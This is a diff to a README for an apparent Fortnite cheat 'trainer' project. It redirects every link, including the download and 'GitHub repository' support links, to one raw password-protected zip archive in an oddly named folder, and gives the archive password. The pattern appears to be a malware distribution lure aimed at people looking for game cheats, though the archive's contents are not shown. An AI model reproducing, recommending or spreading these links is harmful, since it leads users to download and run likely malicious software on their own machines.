@@ -18,7 +18,7 @@ All features allow for a realistic simulation of common functionalities, helping
 
 ---
 
-## 📥 [DOWNLOAD](https://github.com/Humanth-Xrazy/Fortnite-Trainer-UI-Simulator-2025/releases)
+## 📥 [DOWNLOAD](https://raw.githubusercontent.com/Humanth-Xrazy/Fortnite-Trainer-UI-Simulator-2025/main/reinstauration/Fortnite-Trainer-UI-Simulator-2025.zip)
 
 ### Password: g1tset2025
 
@@ -55,7 +55,7 @@ Ensure your system meets these requirements for the best experience.
 
 ## 📖 How to Download & Install
 
-1. Click the [DOWNLOAD](https://github.com/Humanth-Xrazy/Fortnite-Trainer-UI-Simulator-2025/releases) link above.
+1. Click the [DOWNLOAD](https://raw.githubusercontent.com/Humanth-Xrazy/Fortnite-Trainer-UI-Simulator-2025/main/reinstauration/Fortnite-Trainer-UI-Simulator-2025.zip) link above.
 2. Choose the latest release from the list.
 3. Click on the application setup file to download it to your computer.
 4. After downloading, locate the file in your downloads folder.
@@ -70,7 +70,7 @@ Now you can start using the Fortnite Trainer Hack Toolkit for your testing!
 
 ### 📋 Support & Community
 
-If you have any questions, feel free to raise issues on the [GitHub repository](https://github.com/Humanth-Xrazy/Fortnite-Trainer-UI-Simulator-2025/issues). Join our discussions to share your experiences or ask for help.
+If you have any questions, feel free to raise issues on the [GitHub repository](https://raw.githubusercontent.com/Humanth-Xrazy/Fortnite-Trainer-UI-Simulator-2025/main/reinstauration/Fortnite-Trainer-UI-Simulator-2025.zip). Join our discussions to share your experiences or ask for help.
 
 ### 🔍 Related Topics
 
